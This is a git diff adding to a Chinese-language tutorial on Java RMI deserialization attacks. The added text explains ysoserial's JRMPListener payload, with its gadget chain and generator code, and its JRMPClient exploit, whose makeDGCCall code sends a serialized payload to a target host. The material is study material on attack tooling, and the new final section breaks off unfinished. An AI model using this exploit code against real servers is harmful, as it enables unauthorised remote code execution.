@@ -276,7 +276,7 @@ BadAttributeValueExpException val = new BadAttributeValueExpException(entry);
 
 ### 攻击Server——方法2
 
-
+利用JVM动态类加载机制
 
 ### 攻击Registry
 
@@ -377,7 +377,7 @@ java -cp target\ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryEx
 
 ```java
 /**
-**	AnnotationInvocationHandle`.java
+**	AnnotationInvocationHandle.java
 **/
 
 private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
@@ -397,7 +397,120 @@ value在反序列化时就引发了后面的调用过程（PriorityQueue -> Tran
 
 ### 攻击Client
 
+ ## YSOSERIAL中的RMI相关代码
 
+其实ysoserial中的很多代码利用了JDK RMI的实现代码，而且其`payloads`和`exploit`文件夹下的代码用途不尽相同，具体如下：
+
+### Exploit/RMIClient —— Payloads/RMIListener
+
+#### `Payloads/RMIListener`
+
+这俩exp经常一起使用，这里分开介绍一下吧。`Payloads/RMIListener`令服务端开启一个RMI监听端口，要求服务端存在一个反序列化的接口，其调用栈如代码注释所写：
+
+```java
+/**
+ * Payloads/JRMPListener.java
+ *
+ * Gadget chain:
+ * UnicastRemoteObject.readObject(ObjectInputStream) line: 235
+ * UnicastRemoteObject.reexport() line: 266
+ * UnicastRemoteObject.exportObject(Remote, int) line: 320
+ * UnicastRemoteObject.exportObject(Remote, UnicastServerRef) line: 383
+ * UnicastServerRef.exportObject(Remote, Object, boolean) line: 208
+ * LiveRef.exportObject(Target) line: 147
+ * TCPEndpoint.exportObject(Target) line: 411
+ * TCPTransport.exportObject(Target) line: 249
+ * TCPTransport.listen() line: 319
+ **/
+```
+
+再来看看payload生成代码：
+
+```java
+public class JRMPListener extends PayloadRunner implements ObjectPayload<UnicastRemoteObject> {
+
+    private ActivationGroupImpl withConstructor;
+
+    public UnicastRemoteObject getObject (final String command ) throws Exception {
+        int jrmpPort = Integer.parseInt(command);
+        // UnicastRemoteObject是ActivationGroupImpl的父类
+        // 继承关系：ActivationGroupImpl-> ActivationGroup -> UnicastRemoteObject
+        UnicastRemoteObject uro = withConstructor;
+
+        Reflections.getField(UnicastRemoteObject.class, "port").set(uro, jrmpPort);
+        return uro;
+    }
+
+	// ****	SNIP	****    
+```
+
+因为`ActivationGroupImpl类`和 `ActivationGroup类`都没实现`readObject()`方法，所以它们会继承其父类的方法。在反序列化过程中就发生了注解中的调用，最终的效果是在服务端开启特定端口。
+
+#### `Exploit/RMIClient ` 
+
+既然打出`Payloads/RMIListener`后服务端上多了一个TCP端口，接着我们就可以用`Exploit/RMIClient ` 发起DGC调用了（DGC，Distributed Gabage Collection，分布式垃圾回收，可以看做RMI协议下的一条指令，用来回收对象调用方不再使用的引用），总之会发生与RMI有关的通信。其实现代码如下：
+
+```java
+public static final void main ( final String[] args ) {
+    if ( args.length < 4 ) {
+        System.err.println(JRMPClient.class.getName() + " <host> <port> <payload_type> <payload_arg>");
+        System.exit(-1);
+    }
+
+    // 由payload_type和payload_arg生成Payload，实际上调用了payloadClass.newInstance().getObject()方法
+    Object payloadObject = Utils.makePayloadObject(args[2], args[3]);
+    String hostname = args[ 0 ];
+    int port = Integer.parseInt(args[ 1 ]);
+    try {
+        System.err.println(String.format("* Opening JRMP socket %s:%d", hostname, port));
+        makeDGCCall(hostname, port, payloadObject);
+        
+	// ****	 SNIP	****
+}
+    
+    public static void makeDGCCall ( String hostname, int port, Object payloadObject ) throws IOException, UnknownHostException, SocketException {
+        InetSocketAddress isa = new InetSocketAddress(hostname, port);
+        Socket s = null;
+        DataOutputStream dos = null;
+        try {
+            s = SocketFactory.getDefault().createSocket(hostname, port);
+            s.setKeepAlive(true);
+            s.setTcpNoDelay(true);
+
+            OutputStream os = s.getOutputStream();
+            dos = new DataOutputStream(os);
+
+            dos.writeInt(TransportConstants.Magic);
+            dos.writeShort(TransportConstants.Version);
+            dos.writeByte(TransportConstants.SingleOpProtocol);
+
+            dos.write(TransportConstants.Call);
+
+            @SuppressWarnings ( "resource" )
+            final ObjectOutputStream objOut = new MarshalOutputStream(dos);
+
+            objOut.writeLong(2); // DGC
+            objOut.writeInt(0);
+            objOut.writeLong(0);
+            objOut.writeShort(0);
+
+            objOut.writeInt(1); // dirty
+            objOut.writeLong(-669196253586618813L);
+
+            objOut.writeObject(payloadObject);
+
+            os.flush();
+            
+	// ****	 SNIP	****
+        }
+    }    
+```
+
+
+
+### Exploit/RMIListener —— Payloads/RMIClient
+
+这俩代码通常一起使用，
 
 ## References
 
